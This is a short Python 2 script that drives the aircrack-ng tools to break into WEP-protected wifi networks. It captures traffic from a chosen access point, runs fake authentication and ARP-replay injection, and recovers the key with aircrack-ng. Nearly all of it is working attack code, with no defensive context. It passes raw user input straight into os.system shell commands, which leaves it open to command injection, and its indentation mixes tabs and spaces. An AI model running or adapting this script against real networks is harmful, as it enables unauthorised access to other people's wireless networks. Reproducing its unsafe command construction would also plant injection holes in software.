#!/usr/bin/python

import os
import time
import pussylib

def scan():
	os.system("airodump-ng mon1")

def listen():
	os.system("xterm -e airodump-ng -c "+channel+" --bssid "+bssid+" -w box/"+essid+" mon1 &")

def fakeauth():
	fauth_success = "n"
        while (fauth_success == "n"):
		os.system("aireplay-ng -1 0 -e "+essid+" -a "+bssid+" -h "+station+" mon0") 
		fauth_success = raw_input("Fake-auth success?: ")

def deauth():
	os.system("xterm -e aireplay-ng -3 -b "+bssid+" -h "+station+" mon0 &")

def deauthsome1():
	target_station = raw_input("Input station target: ")
	os.system("xterm -e aireplay-ng -3 -b "+bssid+" -h "+target_station+" mon0 &")


def aircrack():
	os.system("gnome-terminal -x aircrack-ng -z -b "+bssid+" "+essid+"*.cap &")

#========================================qr==============================================D


pussylib.init()

scan()

# input target prefs
bssid = raw_input("bssid: ")
essid = raw_input("essid: ")
channel = raw_input("channel: ")
macshow = os.popen("macchanger -s mon0")
station = macshow.read()[13:30]

# starts listening for ivs
listen()

cont = "n"
while (cont == "n"): 
	listen_selection = raw_input("\n 1 Fake-auth(FAST)\n 2 De-auth\n 3 Aircrack\n 4 Quit\n\nplease pick a number: ")
	if listen_selection == "1":
		fakeauth()
	elif listen_selection == "2":
		deauth()
	elif listen_selection == "3":
		aircrack()
	elif listen_selection == "4":
		pussylib.housekeeping()
	else:
	     print"qr,gtfo"
	
print "I'm out biatch"
